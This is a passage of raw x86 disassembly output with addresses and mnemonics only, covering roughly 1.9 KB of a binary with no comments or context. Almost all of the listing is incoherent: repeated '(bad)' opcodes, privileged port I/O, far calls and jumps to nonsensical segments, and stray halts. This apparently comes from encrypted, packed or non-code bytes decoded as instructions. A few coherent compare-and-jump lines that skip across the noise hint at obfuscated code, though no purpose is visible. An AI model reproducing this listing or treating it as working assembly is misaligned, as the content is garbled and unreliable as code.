  41bcaa:	out    0xf6,al
  41bcac:	mov    edi,0xa08b0bb1
  41bcb1:	(bad)  [edi+0x47]
  41bcb4:	or     DWORD PTR [ecx+0x5cc47c],0x5483ff38
  41bcbe:	in     eax,dx
  41bcbf:	rcr    DWORD PTR [eax-0x1c4c7cd2],1
  41bcc5:	dec    esi
  41bcc6:	add    bl,BYTE PTR ds:0xe2b13bf6
  41bccc:	in     eax,0x2f
  41bcce:	xor    BYTE PTR [ecx-0x20],dh
  41bcd1:	call   0x858a:0x16d642d1
  41bcd8:	sbb    ah,0xa9
  41bcdb:	imul   ebx,esp,0xf5a25b79
  41bce1:	add    BYTE PTR [edx-0x20],0x15
  41bce5:	jb     0x41bc8c
  41bce7:	jo     0x41bd54
  41bce9:	pushf  
  41bcea:	shl    DWORD PTR [esi+0x283770c7],0xa6
  41bcf1:	mov    ah,0x70
  41bcf3:	es cs pusha 
  41bcf6:	mov    cl,0xaa
  41bcf8:	lea    esp,[ebx]
  41bcfa:	ret    
  41bcfb:	push   edi
  41bcfc:	jg     0x41bd14
  41bcfe:	fwait
  41bcff:	mov    eax,ds:0x2f56cdd4
  41bd04:	push   eax
  41bd05:	std    
  41bd06:	in     eax,dx
  41bd07:	lds    ebp,FWORD PTR [edi]
  41bd09:	xor    BYTE PTR [ecx+eax*4-0x342fc93e],al
  41bd10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd11:	dec    eax
  41bd12:	das    
  41bd13:	sbb    al,0x12
  41bd15:	fsubr  st(3),st
  41bd17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd18:	pop    ebx
  41bd19:	xor    eax,0xcbfca8c7
  41bd1e:	icebp  
  41bd1f:	jmp    0x41bd25
  41bd21:	gs or  al,0xa5
  41bd24:	push   es
  41bd25:	or     eax,ecx
  41bd27:	aad    0x84
  41bd29:	jl     0x41bcfa
  41bd2b:	ja     0x41bccb
  41bd2d:	sahf   
  41bd2e:	js     0x41bce4
  41bd30:	and    esp,ecx
  41bd32:	jl     0x41bdaf
  41bd34:	xor    al,0x3c
  41bd36:	pop    ebp
  41bd37:	retf   
  41bd38:	into   
  41bd39:	rcl    DWORD PTR [edx],1
  41bd3b:	fmul   QWORD PTR [edi+0x36]
  41bd3e:	mov    bh,0x4c
  41bd40:	sub    al,0xd6
  41bd42:	sbb    eax,0x99d4669c
  41bd47:	xchg   DWORD PTR [esi+ecx*2-0x3c],ebx
  41bd4b:	pop    es
  41bd4c:	sub    ebp,DWORD PTR [ebx+0x79]
  41bd4f:	shl    DWORD PTR [esi],1
  41bd51:	arpl   WORD PTR [eax],ax
  41bd53:	add    ah,BYTE PTR [ebp-0x6aedb8ba]
  41bd59:	pop    ds
  41bd5a:	mov    ebp,0x97391a35
  41bd5f:	call   0x88a0:0x80635d42
  41bd66:	xchg   edi,eax
  41bd67:	ins    BYTE PTR es:[edi],dx
  41bd68:	fisubr WORD PTR [ebx]
  41bd6a:	cmp    eax,0xb8cf23e0
  41bd6f:	retf   0xe113
  41bd72:	shl    bl,cl
  41bd74:	sti    
  41bd75:	mov    eax,ds:0x3783e492
  41bd7a:	lods   eax,DWORD PTR ds:[esi]
  41bd7b:	inc    esi
  41bd7c:	lds    edx,FWORD PTR [esi+ecx*1]
  41bd7f:	les    ebx,FWORD PTR [edi]
  41bd81:	inc    ebx
  41bd82:	loop   0x41bd52
  41bd84:	imul   esp,edi,0x7
  41bd87:	adc    al,0x8b
  41bd89:	dec    ebp
  41bd8a:	or     cl,ch
  41bd8c:	xor    BYTE PTR [edx],al
  41bd8e:	add    BYTE PTR [eax],al
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0x15
  41bd9d:	bound  esp,QWORD PTR [ebx]
  41bd9f:	jmp    0x78c1a844
  41bda4:	adc    BYTE PTR [esi+0x78],bh
  41bda7:	js     0x41be16
  41bda9:	xlat   BYTE PTR ds:[ebx]
  41bdaa:	xlat   BYTE PTR ds:[ebx]
  41bdab:	es aam 0xf0
  41bdae:	scas   al,BYTE PTR es:[edi]
  41bdaf:	rcr    DWORD PTR [eax-0x30],1
  41bdb2:	xchg   edx,eax
  41bdb3:	jns    0x41bdf9
  41bdb5:	push   cs
  41bdb6:	mov    eax,ds:0xa771902f
  41bdbb:	adc    eax,0xc2d4e64d
  41bdc0:	xor    al,0x3
  41bdc2:	mov    eax,DWORD PTR [edi+0x53c9a57c]
  41bdc8:	rcr    ebp,0x83
  41bdcb:	lahf   
  41bdcc:	(bad)  
  41bdcd:	mov    BYTE PTR ds:0xe23ade62,ah
  41bdd3:	stc    
  41bdd4:	jl     0x41bdfa
  41bdd6:	add    al,0x64
  41bdd8:	dec    ebp
  41bdd9:	pop    ebx
  41bdda:	ins    DWORD PTR es:[edi],dx
  41bddb:	(bad)  
  41bddd:	fucomi st,st(1)
  41bddf:	pavgw  mm3,mm5
  41bde2:	or     esi,DWORD PTR [ecx]
  41bde4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bde5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bde6:	push   eax
  41bde7:	pop    ebp
  41bde8:	data16 fiadd WORD PTR [edx+ebx*1+0x59]
  41bded:	sahf   
  41bdee:	clc    
  41bdef:	scas   eax,DWORD PTR es:[edi]
  41bdf0:	dec    DWORD PTR [eax+0x68]
  41bdf3:	mov    ds:0xe95b8986,eax
  41bdf8:	push   ss
  41bdf9:	nop
  41bdfa:	ins    DWORD PTR es:[edi],dx
  41bdfb:	in     eax,0x86
  41bdfd:	sbb    bl,BYTE PTR ds:0x90864bb6
  41be03:	xor    BYTE PTR [edx-0x5f],cl
  41be06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be07:	and    dl,BYTE PTR [ebx-0x64e864b8]
  41be0d:	sub    al,0x7c
  41be0f:	mov    DWORD PTR ds:[ebp-0x612fde7c],eax
  41be16:	inc    eax
  41be17:	pop    ds
  41be18:	mov    edx,0x6908c855
  41be1d:	call   0x28f13b4b
  41be22:	call   0x869e:0xb1160101
  41be29:	les    edi,FWORD PTR [esi]
  41be2b:	dec    eax
  41be2c:	lds    ebx,FWORD PTR [ecx]
  41be2e:	lahf   
  41be2f:	jbe    0x41bdf4
  41be31:	icebp  
  41be32:	pop    edx
  41be33:	(bad)  
  41be34:	sahf   
  41be35:	ja     0x41be15
  41be37:	retf   0x1009
  41be3a:	adc    eax,0x87fb9ead
  41be3f:	in     al,0xb1
  41be41:	lea    ebx,[edi-0x69750205]
  41be47:	mov    bh,al
  41be49:	sbb    bl,BYTE PTR [ebx+0x69]
  41be4c:	mov    edi,0x83365111
  41be51:	sbb    esi,DWORD PTR [eax-0x3b]
  41be54:	inc    edx
  41be55:	pusha  
  41be56:	add    DWORD PTR [esi],edx
  41be58:	hlt    
  41be59:	repz call 0x21a8de76
  41be5f:	xor    bl,BYTE PTR [ecx]
  41be61:	aad    0x24
  41be63:	mov    edx,fs
  41be65:	hlt    
  41be66:	and    al,0x98
  41be68:	jbe    0x41bea5
  41be6a:	xor    esp,DWORD PTR [edi-0x6f98e617]
  41be70:	fwait
  41be71:	outs   dx,DWORD PTR ds:[esi]
  41be72:	jae    0x41be89
  41be74:	das    
  41be75:	int3   
  41be76:	popf   
  41be77:	std    
  41be78:	mov    cl,0x6e
  41be7a:	mov    ah,0x56
  41be7c:	rcr    BYTE PTR [edi-0x55392d2b],cl
  41be82:	xor    al,0x9f
  41be84:	add    cl,BYTE PTR [esi]
  41be86:	sub    al,0xa2
  41be88:	aas    
  41be89:	test   BYTE PTR [esi+eiz*4],cl
  41be8c:	lock inc DWORD PTR [ecx+eiz*1+0x59be2d4b]
  41be94:	mov    dl,0x4a
  41be96:	sbb    dl,BYTE PTR [ebx-0x60ce3c1]
  41be9c:	jl     0x41be74
  41be9e:	and    eax,0xb71881a7
  41bea3:	fistp  QWORD PTR [edi]
  41bea5:	rcr    DWORD PTR [edi-0x28d6f814],1
  41beab:	in     al,dx
  41beac:	jmp    0x100c:0x965e707b
  41beb3:	pop    ds
  41beb4:	test   DWORD PTR [edi-0x4d],ebx
  41beb7:	xor    al,0x2a
  41beb9:	loopne 0x41bf39
  41bebb:	cld    
  41bebc:	ret    
  41bebd:	push   cs
  41bebe:	jp     0x41be42
  41bec0:	mov    eax,ds:0x277e32b5
  41bec5:	mov    dh,0xac
  41bec7:	dec    ebx
  41bec8:	mov    esi,0xac066ee3
  41becd:	pop    ebp
  41bece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41becf:	fidiv  DWORD PTR [ebp-0x50d3082c]
  41bed5:	mov    al,0xe6
  41bed7:	cmp    al,0x10
  41bed9:	pop    eax
  41beda:	repnz inc esp
  41bedc:	add    cl,al
  41bede:	and    ch,dl
  41bee0:	xchg   edi,eax
  41bee1:	hlt    
  41bee2:	adc    al,BYTE PTR [ebx+0x1c]
  41bee5:	mov    ch,0x6c
  41bee7:	mov    ch,0xf1
  41bee9:	push   0x972a8f5
  41beee:	jg     0x41bf23
  41bef0:	fst    DWORD PTR [edx+0x0]
  41bef3:	or     esp,DWORD PTR [esi]
  41bef5:	xchg   DWORD PTR [ebx+0x2f],ebx
  41bef8:	and    al,0x9f
  41befa:	in     al,dx
  41befb:	ds dec ecx
  41befd:	or     ah,BYTE PTR [eax]
  41beff:	xchg   edi,eax
  41bf00:	jg     0x41bf6e
  41bf02:	and    bl,BYTE PTR [eax]
  41bf04:	or     DWORD PTR [ebx-0xf],ecx
  41bf07:	fs adc ebp,eax
  41bf0a:	ins    BYTE PTR es:[edi],dx
  41bf0b:	jb     0x41bf81
  41bf0d:	mov    eax,ds:0x1d86ec59
  41bf12:	push   0xffffffee
  41bf14:	std    
  41bf15:	outs   dx,BYTE PTR ds:[esi]
  41bf16:	lahf   
  41bf17:	or     eax,0xfcaf402e
  41bf1c:	int    0x2d
  41bf1e:	bound  ebp,QWORD PTR [esi-0x4d]
  41bf21:	mov    ebx,0x5384235e
  41bf26:	adc    dh,ah
  41bf28:	pop    edx
  41bf29:	mov    ebx,ebx
  41bf2b:	sub    al,ch
  41bf2d:	xchg   edi,eax
  41bf2e:	pop    es
  41bf2f:	(bad)  
  41bf30:	stc    
  41bf31:	and    esi,esi
  41bf33:	or     BYTE PTR [edi],0x57
  41bf36:	je     0x41bf0b
  41bf38:	mov    edx,0x465766d2
  41bf3d:	rcr    DWORD PTR [esi+0x19a39942],cl
  41bf43:	pop    ecx
  41bf44:	into   
  41bf45:	outs   dx,DWORD PTR ds:[esi]
  41bf46:	mov    DWORD PTR [esi+0x48d13a7d],0x5871496b
  41bf50:	scas   al,BYTE PTR es:[edi]
  41bf51:	ja     0x41bf25
  41bf53:	lahf   
  41bf54:	mov    esp,0x28485b85
  41bf59:	mov    BYTE PTR [ebp+0x5755793c],bh
  41bf5f:	xor    eax,DWORD PTR [edi+0x7d6845d8]
  41bf65:	xchg   ebx,eax
  41bf66:	lea    esp,[edi-0x36]
  41bf69:	xchg   esp,eax
  41bf6a:	push   ebx
  41bf6b:	xor    dl,0x17
  41bf6e:	call   0x9cc1b748
  41bf73:	jae    0x41bfdf
  41bf75:	jmp    0x24:0x7ba08eac
  41bf7c:	xchg   esp,eax
  41bf7d:	cli    
  41bf7e:	sub    al,0x29
  41bf80:	mov    ds:0xb91ef97,al
  41bf85:	hlt    
  41bf86:	adc    BYTE PTR [edx+0x9],dh
  41bf89:	lods   eax,DWORD PTR ds:[esi]
  41bf8a:	dec    ebx
  41bf8b:	adc    esi,DWORD PTR [edx]
  41bf8d:	pop    ds
  41bf8e:	imul   DWORD PTR [edx-0x54]
  41bf91:	in     al,0x5a
  41bf93:	mov    al,0xc8
  41bf95:	bound  edx,QWORD PTR [ebp+0x17]
  41bf98:	cmp    dh,cl
  41bf9a:	mov    al,ds:0x44be5f02
  41bfa0:	xchg   esp,eax
  41bfa1:	mov    cl,0xa
  41bfa3:	pop    ebx
  41bfa4:	add    cl,BYTE PTR [edi+ebx*8]
  41bfa7:	sbb    al,0x12
  41bfa9:	aam    0x8b
  41bfab:	mov    ecx,0x1574674e
  41bfb0:	adc    BYTE PTR [ebp+edi*1-0x1b],dl
  41bfb4:	or     DWORD PTR [ecx+0x2e],edi
  41bfb7:	xor    eax,0xa6ee64c6
  41bfbc:	or     DWORD PTR [edi+eax*1],eax
  41bfbf:	outs   dx,DWORD PTR ds:[esi]
  41bfc0:	lea    ecx,[edx+ecx*1+0x327298]
  41bfc7:	cmp    ecx,eax
  41bfc9:	jne    0x41b45c
  41bfcf:	mov    ebx,esi
  41bfd1:	jmp    0x41bfdb
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	jne    0x41c02e
  41bff1:	in     al,0x6c
  41bff3:	mov    eax,0x10787fe8
  41bff8:	jle    0x41c072
  41bffa:	js     0x41c045
  41bffc:	add    BYTE PTR [eax-0x145752cf],al
  41c002:	xlat   BYTE PTR ds:[ebx]
  41c003:	sub    eax,0x9e7ef35b
  41c008:	fist   DWORD PTR [ebx+0x52]
  41c00b:	pop    es
  41c00c:	shl    BYTE PTR ds:0x5f01eee5,cl
  41c012:	cmp    dl,BYTE PTR [ebp+0xc4af6ea]
  41c018:	in     eax,0x91
  41c01a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c01b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c01c:	clc    
  41c01d:	shr    BYTE PTR [ebx-0x6bbfa3df],0x93
  41c024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c026:	inc    edx
  41c027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c028:	fldcw  WORD PTR [ecx-0xc]
  41c02b:	mov    ds:0x35f0e733,al
  41c030:	xor    dl,BYTE PTR [edx+eiz*8+0x47]
  41c034:	call   0xc46f1f3b
  41c039:	sbb    eax,0x1aaaa669
  41c03e:	pop    ds
  41c03f:	cmpxchg DWORD PTR [edx+0xb2193a5],edi
  41c046:	addr16 clc 
  41c048:	jbe    0x41c010
  41c04a:	xchg   esp,eax
  41c04b:	lods   al,BYTE PTR ds:[esi]
  41c04c:	enter  0x6217,0x86
  41c050:	cwde   
  41c051:	pop    edi
  41c052:	in     eax,0xcb
  41c054:	add    eax,0xb60394b4
  41c059:	daa    
  41c05a:	or     cl,al
  41c05c:	inc    ebx
  41c05d:	sub    eax,0xc0678dc6
  41c062:	push   esi
  41c063:	ins    DWORD PTR es:[edi],dx
  41c064:	mov    edi,0x62b62a1f
  41c069:	pop    esi
  41c06a:	dec    ebx
  41c06b:	pop    ebx
  41c06c:	loopne 0x41c09f
  41c06e:	mov    dl,0x18
  41c070:	call   0xf6cb3b2c
  41c075:	mov    ?,eax
  41c077:	add    eax,0xe9a8ad56
  41c07c:	adc    eax,0x944814fd
  41c081:	cmc    
  41c082:	cmp    bh,ah
  41c084:	daa    
  41c085:	aaa    
  41c086:	xchg   DWORD PTR [esi-0x5f4a1c6c],esp
  41c08c:	enter  0xc71e,0x92
  41c090:	jmp    0x8755:0xf54ead33
  41c097:	mov    ecx,0xc3c42628
  41c09c:	gs sbb al,0xb1
  41c09f:	push   ss
  41c0a0:	xor    al,0x30
  41c0a2:	push   ecx
  41c0a3:	add    dh,BYTE PTR [eax+edi*1]
  41c0a6:	ret    
  41c0a7:	mov    BYTE PTR ds:0x737e7147,ch
  41c0ad:	(bad)  
  41c0ae:	jae    0x41c0f2
  41c0b0:	adc    DWORD PTR [ebx+edx*1+0x27],ebp
  41c0b4:	adc    DWORD PTR [ebx+0x5c],ebx
  41c0b7:	mov    edi,0x5d0111ac
  41c0bc:	arpl   cx,sp
  41c0be:	and    al,0x71
  41c0c0:	xor    ah,bh
  41c0c2:	mov    eax,DWORD PTR [edi-0x28]
  41c0c5:	call   0xdcf:0xa525ddcb
  41c0cc:	or     eax,0x25c14192
  41c0d1:	mov    ebx,0x70f5014a
  41c0d6:	lock mov dl,0xc5
  41c0d9:	sub    DWORD PTR [ecx+0x37],edx
  41c0dc:	iret   
  41c0dd:	lock jg 0x41c155
  41c0e0:	hlt    
  41c0e1:	xor    al,0x7a
  41c0e3:	mov    al,ds:0xae6b94b2
  41c0e8:	inc    esi
  41c0e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0ea:	imul   eax,DWORD PTR [edx],0x2e
  41c0ed:	bound  ebp,QWORD PTR [edi+0x66]
  41c0f0:	mov    esp,DWORD PTR [esi+0x0]
  41c0f3:	mov    bl,0xd9
  41c0f5:	cmp    al,0x43
  41c0f7:	das    
  41c0f8:	add    al,0x21
  41c0fa:	xchg   esi,eax
  41c0fb:	pop    eax
  41c0fc:	and    BYTE PTR [edx-0x7],dl
  41c0ff:	inc    eax
  41c100:	js     0x41c0ba
  41c102:	mov    bh,0xad
  41c104:	stos   DWORD PTR es:[edi],eax
  41c105:	add    DWORD PTR [ebp-0x71],ebp
  41c108:	retf   0x8955
  41c10b:	pop    esi
  41c10c:	adc    edx,DWORD PTR [edi]
  41c10e:	jbe    0x41c0db
  41c110:	test   DWORD PTR [ebx-0x51],0xc194db89
  41c117:	hlt    
  41c118:	dec    ecx
  41c119:	(bad)  
  41c11a:	cmc    
  41c11b:	pop    edi
  41c11c:	test   eax,0x1d493761
  41c121:	mov    ds:0x3e242f21,eax
  41c126:	inc    eax
  41c127:	aas    
  41c128:	xor    al,0x63
  41c12a:	sti    
  41c12b:	sbb    dh,BYTE PTR [esp+esi*1+0x3c]
  41c12f:	cmc    
  41c130:	out    dx,eax
  41c131:	out    0x75,al
  41c133:	sub    BYTE PTR [esi+0x2f],cl
  41c136:	mov    dl,0x87
  41c138:	dec    ebx
  41c139:	out    0x16,eax
  41c13b:	mov    edx,0x5896bdb4
  41c140:	(bad)  
  41c141:	cmp    dl,al
  41c143:	inc    ecx
  41c144:	repz mov esp,0x18e55b92
  41c14a:	xchg   BYTE PTR [edx],cl
  41c14c:	cli    
  41c14d:	fnstsw WORD PTR [edi-0x57d29a38]
  41c153:	cmp    DWORD PTR [edi+0x6e4bc7e0],ecx
  41c159:	sbb    bl,ah
  41c15b:	dec    esp
  41c15c:	and    BYTE PTR [edi],al
  41c15e:	iret   
  41c15f:	or     dl,BYTE PTR [ebx-0x25]
  41c162:	(bad)  
  41c163:	fidiv  WORD PTR [eax+ecx*2+0x5d]
  41c167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c168:	in     al,0x77
  41c16a:	cmp    esi,ecx
  41c16c:	pushf  
  41c16d:	stos   BYTE PTR es:[edi],al
  41c16e:	jne    0x41c19d
  41c170:	jl     0x41c1c7
  41c172:	xor    BYTE PTR [ebp+0x4c],ch
  41c175:	sbb    edx,edi
  41c177:	mov    ah,0x61
  41c179:	jg     0x41c106
  41c17b:	in     eax,dx
  41c17c:	repnz stos DWORD PTR es:[edi],eax
  41c17e:	outs   dx,BYTE PTR ds:[esi]
  41c17f:	scas   eax,DWORD PTR es:[edi]
  41c180:	mov    al,0x25
  41c182:	and    DWORD PTR [esi+0x2d25f264],esi
  41c188:	dec    esi
  41c189:	add    BYTE PTR [ecx+esi*8-0x1c290ecf],al
  41c190:	das    
  41c191:	xchg   ebx,eax
  41c192:	and    bh,0x8f
  41c195:	ret    
  41c196:	xchg   ebx,eax
  41c197:	mov    cl,BYTE PTR [edx-0x4684f6dd]
  41c19d:	outs   dx,BYTE PTR ds:[esi]
  41c19e:	test   DWORD PTR [eax+0x76],ebp
  41c1a1:	out    0x3,al
  41c1a3:	mov    edx,0x4727036c
  41c1a8:	aaa    
  41c1a9:	out    0x31,al
  41c1ab:	mov    bl,BYTE PTR [edx+esi*8-0x268fc85c]
  41c1b2:	inc    edi
  41c1b3:	stc    
  41c1b4:	push   eax
  41c1b5:	ja     0x41c14e
  41c1b7:	mov    esi,0x9d2220d2
  41c1bc:	bound  esi,QWORD PTR [ecx-0x7d]
  41c1bf:	xor    DWORD PTR [esi-0x7],edi
  41c1c2:	sbb    edx,esp
  41c1c4:	jecxz  0x41c179
  41c1c6:	js     0x41c181
  41c1c8:	ret    0x79d1
  41c1cb:	mov    dl,0xd2
  41c1cd:	jg     0x41c1a9
  41c1cf:	fsub   QWORD PTR [edi+ebp*1+0x28e8708c]
  41c1d6:	cmp    DWORD PTR [edx+0x61],esp
  41c1d9:	icebp  
  41c1da:	adc    ah,BYTE PTR [ebp-0x57f4053c]
  41c1e0:	lds    edx,FWORD PTR [edi-0xf]
  41c1e3:	jbe    0x41c20c
  41c1e5:	lods   eax,DWORD PTR ds:[esi]
  41c1e6:	push   0x2168c0f7
  41c1eb:	xor    eax,0xcbf94c1
  41c1f0:	gs (bad) 
  41c1f2:	cmp    edi,DWORD PTR [eax]
  41c1f4:	int3   
  41c1f5:	js     0x41c266
  41c1f7:	aaa    
  41c1f8:	mov    dh,0xff
  41c1fa:	stos   DWORD PTR es:[edi],eax
  41c1fb:	repnz lgs eax,FWORD PTR [edi]
  41c1ff:	push   esp
  41c200:	jmp    0xcac9:0xf2a5e10d
  41c207:	cmp    eax,0x3b3a8231
  41c20c:	cld    
  41c20d:	bound  ebp,QWORD PTR [ebp+0x7a6c72f2]
  41c213:	xor    eax,0x7510850
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	lea    eax,[esi]
  41c22d:	leave  
  41c22e:	mov    dl,BYTE PTR [eax-0x12]
  41c231:	jg     0x41c2ab
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c29b
  41c238:	jecxz  0x41c22b
  41c23a:	les    eax,FWORD PTR [edx]
  41c23c:	xchg   ebp,eax
  41c23d:	mov    ebx,0xe6106c57
  41c242:	retf   0x7f06
  41c245:	jmp    0x41c20a
  41c247:	add    al,0x84
  41c249:	add    ecx,eax
  41c24b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c24c:	out    0x15,al
  41c24e:	lods   al,BYTE PTR ds:[esi]
  41c24f:	data16 int 0xad
  41c252:	inc    edx
  41c253:	(bad)  
  41c255:	mov    cl,0xc
  41c257:	xchg   esp,eax
  41c258:	loopne 0x41c242
  41c25a:	add    DWORD PTR [edx-0x6585521c],edx
  41c260:	fld    TBYTE PTR [edx-0x55]
  41c263:	ins    DWORD PTR es:[edi],dx
  41c264:	mul    BYTE PTR [esi-0x5c7b7245]
  41c26a:	jg     0x41c208
  41c26c:	dec    edi
  41c26d:	test   BYTE PTR [ebp-0x6ed13bc5],ch
  41c273:	pop    eax
  41c274:	std    
  41c275:	inc    ebx
  41c276:	cmp    eax,0x3e501bfd
  41c27b:	sbb    ebx,0x3bd2509d
  41c281:	daa    
  41c282:	adc    al,0x58
  41c285:	imul   edx,DWORD PTR [ebx-0x20],0x6b8e4d7b
  41c28c:	in     eax,0xdb
  41c28e:	xor    dl,BYTE PTR [ebx+0x3e]
  41c291:	push   ds
  41c292:	push   ebx
  41c293:	out    0xb0,eax
  41c295:	test   DWORD PTR [edi+ebp*8+0x35934b45],ecx
  41c29c:	cmp    BYTE PTR ds:0x8a4967fd,bl
  41c2a2:	jnp    0x41c26c
  41c2a4:	push   ss
  41c2a5:	inc    esp
  41c2a6:	fwait
  41c2a7:	je     0x41c24e
  41c2a9:	frstor [edi+0x69]
  41c2ac:	shr    DWORD PTR [ecx-0xd],cl
  41c2af:	in     eax,dx
  41c2b0:	jl     0x41c25b
  41c2b2:	in     al,dx
  41c2b3:	mov    edx,0xddf0a0e4
  41c2b8:	enter  0x9c59,0x8a
  41c2bc:	fimul  WORD PTR [ebx+eax*2+0x3e996ab2]
  41c2c3:	or     bh,BYTE PTR [esi]
  41c2c5:	ror    DWORD PTR [esi],1
  41c2c7:	cld    
  41c2c8:	push   eax
  41c2c9:	scas   eax,DWORD PTR es:[edi]
  41c2ca:	ret    0x4137
  41c2cd:	fstp   TBYTE PTR [edi+0x14]
  41c2d0:	push   ds
  41c2d1:	pop    ebx
  41c2d2:	fcmovnu st,st(2)
  41c2d4:	push   ebx
  41c2d5:	jl     0x41c2cd
  41c2d7:	cdq    
  41c2d8:	jns    0x41c27a
  41c2da:	lods   al,BYTE PTR ds:[esi]
  41c2db:	sub    esi,ebp
  41c2dd:	out    dx,eax
  41c2de:	popa   
  41c2df:	mov    ds:0x606f1e0c,al
  41c2e4:	outs   dx,BYTE PTR ds:[esi]
  41c2e5:	add    ebx,DWORD PTR [edi+0x5ac5211c]
  41c2eb:	loope  0x41c35f
  41c2ed:	repnz and edi,DWORD PTR [edx-0x7c02b216]
  41c2f4:	imul   edx,DWORD PTR [ebp+0x36e4b70],0xffffffb5
  41c2fb:	jmp    0x41c36b
  41c2fd:	hlt    
  41c2fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2ff:	(bad)  
  41c300:	mov    WORD PTR [eax],ss
  41c302:	icebp  
  41c303:	adc    dh,BYTE PTR [esi]
  41c305:	arpl   WORD PTR [edx+0x7a],ax
  41c308:	add    DWORD PTR [ebx-0x38548b75],eax
  41c30e:	xor    eax,0xdd17fb9
  41c313:	iret   
  41c314:	int    0xb
  41c316:	test   DWORD PTR [ecx-0x2df41713],edi
  41c31c:	dec    DWORD PTR [esi]
  41c31e:	mov    es,WORD PTR [eax]
  41c320:	fcomp  DWORD PTR [eax+0x5414d8a3]
  41c326:	xchg   ebx,eax
  41c327:	jns    0x41c341
  41c329:	(bad)  
  41c32a:	fcomip st,st(4)
  41c32c:	dec    edi
  41c32d:	mov    bl,0x7a
  41c32f:	loopne 0x41c398
  41c331:	out    0xb2,eax
  41c333:	mov    ah,0xa1
  41c335:	or     al,0xca
  41c337:	test   cl,cl
  41c339:	bound  edx,QWORD PTR [edi-0xb414558]
  41c33f:	mov    ch,0x9d
  41c341:	iret   
  41c342:	loop   0x41c39a
  41c344:	pop    ebp
  41c345:	call   0x51e8:0x4b8f2f5c
  41c34c:	(bad)  
  41c34d:	adc    ch,BYTE PTR [edx-0x601b540]
  41c353:	xlat   BYTE PTR ds:[ebx]
  41c354:	adc    eax,0x5551469a
  41c359:	jp     0x41c30e
  41c35b:	mov    cl,BYTE PTR [ecx+ebx*1-0x799ecd94]
  41c362:	lds    esi,FWORD PTR [ebx+ebx*2]
  41c365:	jl     0x41c350
  41c367:	fsub   DWORD PTR [edx+eax*4+0x34]
  41c36b:	or     bl,BYTE PTR [esi+0x9160f28]
  41c371:	test   al,bl
  41c373:	arpl   ax,si
  41c375:	mov    bh,BYTE PTR [esi+0xe]
  41c378:	push   0xffffffc5
  41c37a:	enter  0x3e69,0xd9
  41c37e:	jmp    0x41c3bf
  41c380:	outs   dx,DWORD PTR ds:[esi]
  41c381:	in     eax,0xf4
  41c383:	jmp    0x1a22a32f
  41c388:	stos   BYTE PTR es:[edi],al
  41c389:	icebp  
  41c38a:	loope  0x41c37e
  41c38c:	stc    
  41c38d:	sti    
  41c38e:	leave  
  41c38f:	mov    ebp,0xd5842120
  41c394:	loop   0x41c33e
  41c396:	mov    esi,0x60065763
  41c39b:	mov    eax,0xf7ae182c
  41c3a0:	sbb    cl,BYTE PTR [ecx+0x4d]
  41c3a3:	xchg   esp,eax
  41c3a4:	and    cl,BYTE PTR [edx+0x39]
  41c3a7:	(bad)  
  41c3a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3a9:	push   0xffffffe1
  41c3ab:	dec    esi
  41c3ac:	aam    0xac
  41c3ae:	and    dl,BYTE PTR [edi+edi*8-0x64dfd06a]
  41c3b5:	cli    
  41c3b6:	loop   0x41c3fb
  41c3b8:	(bad)  
  41c3b9:	cld    
  41c3ba:	lds    ebp,FWORD PTR [eax+0x7748e62c]
  41c3c0:	jo     0x41c425
  41c3c2:	shl    BYTE PTR [edi-0x2b9d7b91],0x7a
  41c3c9:	mov    ebx,DWORD PTR [ebx+0x77]
  41c3cc:	add    BYTE PTR [ebx],0x22
  41c3cf:	aaa    
  41c3d0:	cmp    bh,BYTE PTR [edi]
  41c3d2:	inc    edi
  41c3d3:	add    eax,0x117d857
  41c3d8:	pop    es
  41c3d9:	add    ch,ch
  41c3db:	lea    edi,[ebx]
  41c3dd:	mov    DWORD PTR [ecx+esi*8+0x2b],ebx
  41c3e1:	inc    ebp
  41c3e2:	push   es
  41c3e3:	repz fcom DWORD PTR [ecx]
  41c3e6:	in     al,0xfa
  41c3e8:	xchg   edx,eax
  41c3e9:	sbb    eax,0x49b5e434
  41c3ee:	sub    DWORD PTR [ebx+0x70982ad6],esp
  41c3f4:	cli    
  41c3f5:	outs   dx,DWORD PTR ds:[esi]
  41c3f6:	imul   BYTE PTR [ebx+0x3391ef91]
  41c3fc:	mov    bh,0xda
  41c3fe:	es mov esi,0xbbc4309c
  41c404:	out    0xd1,eax
  41c406:	jb     0x41c3bb
  41c408:	leave  
  41c409:	push   ss
  41c40a:	scas   eax,DWORD PTR es:[edi]
  41c40b:	sbb    al,0x4e
  41c40d:	xor    eax,0x338ada5d
  41c412:	sahf   
  41c413:	outs   dx,BYTE PTR ds:[esi]
  41c414:	mov    eax,ds:0xa45c41d2
  41c419:	xor    DWORD PTR [esi+0x79],ebp
